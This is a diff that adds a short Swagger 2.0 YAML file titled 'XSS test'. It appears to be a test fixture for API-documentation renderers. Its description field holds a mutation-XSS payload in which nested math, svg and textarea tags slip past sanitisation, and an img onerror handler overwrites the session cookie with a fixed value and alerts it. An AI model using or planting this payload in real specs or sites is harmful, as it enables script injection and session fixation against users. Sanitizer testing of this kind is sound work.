@@ -1,0 +1,22 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: |
+    <math>
+      <mtext>
+        <h1>
+          <a>
+            <h6></a></h6>
+            <mglyph>
+              <svg>
+                <mtext>
+                  <textarea>
+                    <a title='</textarea>
+                    <img src onerror="document.cookie='portal.cookie.sid=s%3A3NNuX90RHs1M1nz4Zhz0R-9iqKy0RRl3.yNh76RTwsfvRI1uEW%2B1WmbaOUJohUmwp8JwEnDiaGzw; path=/;'; alert(document.cookie);">
+                  </textarea>
+                </mtext>
+              </svg>
+            </mglyph>
+          </mtext>
+        </math>
+  version: production
